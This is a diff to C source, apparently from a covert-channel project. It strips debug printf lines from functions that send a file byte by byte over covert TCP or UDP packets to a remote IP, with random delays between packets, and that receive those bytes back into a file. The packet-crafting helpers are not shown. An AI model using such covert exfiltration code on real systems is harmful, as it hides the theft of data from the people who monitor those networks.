@@ -36,11 +36,9 @@ void recv_results(char* sip, unsigned short sport, char* filename, bool tcp) {
         input = covert_udp_recv(sip, sport, true, false, false);
         }
         if(input > 0) {
-            printf("Output(%d): %c\n", input, input);
             fprintf(file, "%c", input);
             fflush(file);
         } else if (input == -1){
-            printf("Covert Receive Complete\n");
             fclose(file);
             return;
         }
@@ -62,7 +60,6 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
     }
 
     while((input = fgetc(file)) != EOF) {
-        printf("Character to send: %d\n", input);
         if(tcp){
             covert_send(sip, dip, sport, dport, (unsigned char *) &input, 1); //send the packet
         } else {
@@ -71,13 +68,11 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
         start = clock();    //start of clock
         timer_complete = 0;    //reset the timer again
         delay = rand_delay(max_delay);
-        printf("delay: %d\n", delay);
 
         //wait for the timer to complete
         while(timer_complete == 0) {
             passed = (clock() - start) / CLOCKS_PER_SEC;
             if(passed >= delay) {
-                printf("Delay completed\n");
                 timer_complete = 1;
             }
         }
@@ -90,7 +85,6 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
         covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, 3);
     }
 
-    printf("completed\n");
     fclose(file);
 }
 
